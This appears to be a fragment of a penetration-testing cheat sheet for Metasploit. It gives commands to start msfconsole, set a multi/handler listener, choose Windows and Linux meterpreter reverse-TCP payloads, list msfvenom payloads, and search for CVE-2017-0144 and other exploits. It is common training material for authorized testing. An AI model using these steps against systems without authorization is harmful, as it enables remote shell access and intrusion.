
```
msfconsole -q
```
##### Start Listener

```
use exploit/multi/handler
```

###### Windows Payload

x64 
```
set payload windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
```

x86 

```
set payload windows/meterpreter/reverse_tcp
```
###### Linux Payload

```
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
```

###### How to see all payloads

```
msfvenom -l payloads
```

## Vulnerability Assessment

Search for CVE

```
search cve:2017-0144
```

Search for Exploit

```
search type:exploit <service_name>
```